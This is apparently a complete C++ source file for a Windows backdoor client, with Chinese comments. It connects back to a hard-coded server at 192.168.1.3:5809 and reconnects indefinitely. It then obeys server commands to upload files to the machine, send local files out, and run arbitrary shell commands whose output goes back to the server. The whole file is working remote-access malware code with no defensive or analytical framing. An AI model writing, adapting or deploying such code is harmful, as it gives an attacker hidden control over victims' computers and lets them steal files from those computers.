#include "main.h"

int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hprevinstance, LPSTR lpcmdline, int ncmdshow)
{
	tcpSocket mysocket("192.168.1.3", 5809);
	protocolParsing(&mysocket);
	return 0;
}

void protocolParsing(tcpSocket *mysocket)
{
	myProtocol recvInfo, isSussess; bool result;
	connectServer(mysocket);

	while (true)
	{
		if (mysocket->tcpRecv((char *)&recvInfo, sizeof(recvInfo)) == false)               // 循环接受服务端的消息
			connectServer(mysocket);
		else
		{
			switch (recvInfo.type)
			{
			case 1:                                                                            // type = 1 用于文件的上传
				result = recvToServer(&recvInfo, mysocket);
				break;

			case 2:                                                                            // type = 2 用于文件的下载
				result = sendToServer(&recvInfo, mysocket);
				break;

			case 4:                                                                            // type = 4 用于命令执行
				result = systemCmd(&recvInfo, mysocket);
				break;

			default:
				break;
			}
		}
		Sleep(2000);
	}
}

bool connectServer(tcpSocket *mysocket)
{
	while (true)
	{
		if (mysocket->tcpConnect())
			break;
		Sleep(3000);
	}
	return true;
}

bool recvToServer(myProtocol *recvInfo, tcpSocket *mysocket)
{
	myProtocol send;
	if (recvInfo->fileSize < 0 || recvInfo->fileSize > 0x1f400000)
		send.type = 12;
	else
		send.type = 3;

	// 告知客户端已经准备就绪
	if (mysocket->tcpSend((char*)&send, sizeof(send)) == false)                            
		return false;
	
	// 根据服务端传来的文件大小创建堆
	HANDLE hHeap, hAlloc;
	hHeap = ::HeapCreate(0, recvInfo->fileSize, NULL);
	if (hHeap)
	{
		hAlloc = ::HeapAlloc(hHeap, HEAP_ZERO_MEMORY, recvInfo->fileSize);
		if (!hAlloc)
			return false;
	}
	else
		return false;
	
	// 等待服务端传输文件
	if (mysocket->tcpRecv((char *)hAlloc, recvInfo->fileSize) == false)                
		return false;

	// 在客户端创建文件
	file myfile(recvInfo->clientFile);
	if (myfile.fileWrite((char *)hAlloc, recvInfo->fileSize) == false)
		return false;

	// 清理资源
	if (hHeap != NULL && hAlloc != NULL)
		::HeapFree(hHeap, 0, hAlloc);

	return true;
}

bool sendToServer(myProtocol *recvInfo, tcpSocket *mysocket)
{
	myProtocol send;
	file myfile(recvInfo->clientFile);
	HANDLE data = myfile.fileRead();
	if (data == false)
	{
		send.type = 12;
		mysocket->tcpSend((char *)&send, sizeof(send));
		return false;
	}

	send.fileSize = myfile.fileSizeL;
	send.type = 3;
	
	// 告知服务端文件的大小, 并且等待服务端准备就绪
	if (mysocket->tcpSend((char *)&send, sizeof(send)))
	{
		if (mysocket->tcpRecv((char *)&send, sizeof(send)) == false)
			return false;
	}
	else
		return false;

	// 服务端准备就绪之后客户端开始向服务端发送文件
	if (send.type == 3)
	{
		if (mysocket->tcpSend((char *)data, myfile.fileSizeL) == false)
			return false;
	}
	else
		return false;

	return true;
}

bool systemCmd(myProtocol *recvInfo, tcpSocket *mysocket)
{
	HANDLE hHeap, hAlloc;
	myProtocol cmd; FILE *fp; char buffer[100] = { 0 }; int index = 1; int size = 100000;
	if (strlen(recvInfo->cmdChar) > MAX_PATH || recvInfo->cmdChar == NULL)
	{
		cmd.type = 12;
		if (mysocket->tcpSend((char *)&cmd, sizeof(cmd)))
			return false;
	}

	hHeap = HeapCreate(0, size, NULL);
	if (hHeap)
	{
		hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
		if (!hAlloc)
			return false;
	}
	else
		return false;

	if ((fp = _popen(recvInfo->cmdChar, "r")) != NULL)
	{
		while (fgets(buffer, 100, fp) != NULL)
		{
			if (index == size / 100)
				break;
			strcat((char *)hAlloc, buffer);
			index += 1;
		}
		if (_pclose(fp) == -1)
			return false;
	}
	else
		return false;

	if (mysocket->tcpSend((char *)hAlloc, size) == false)
		return false;
	return true;
}